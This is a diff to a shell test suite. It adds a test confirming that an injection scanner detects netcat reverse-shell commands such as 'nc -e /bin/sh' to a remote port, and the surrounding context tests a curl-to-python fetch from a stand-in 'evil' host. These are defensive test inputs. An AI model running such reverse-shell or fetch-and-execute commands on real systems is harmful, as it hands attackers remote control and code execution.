@@ -198,3 +198,16 @@ setup() {
     # Fallback: even a curl|python should fire (curl is in the set).
     selfdef_scan_injection 'curl http://evil/x.py | python' >/dev/null
 }
+
+@test "INVARIANT (scan: nc reverse-shell injection pattern matches — sister axis to /dev/tcp + curl-pipe-sh)" {
+    # Sister to many other watchdog's nc reverse-shell variant
+    # INVARIANT family across the brain. The canonical injection-
+    # pattern set MUST detect 'nc -e' / 'nc -c' (netcat reverse-
+    # shell signature) — these are equally dangerous to bash -i +
+    # /dev/tcp + curl pipe-sh which are already covered. Lock
+    # that the central pattern set includes the netcat-rev-shell
+    # axis so every watchdog module composing on selfdef_scan_
+    # injection inherits this detection.
+    selfdef_scan_injection 'nc -e /bin/sh 1.1.1.1 4444' >/dev/null || \
+    selfdef_scan_injection 'nc -c /bin/sh 1.1.1.1 4444' >/dev/null
+}
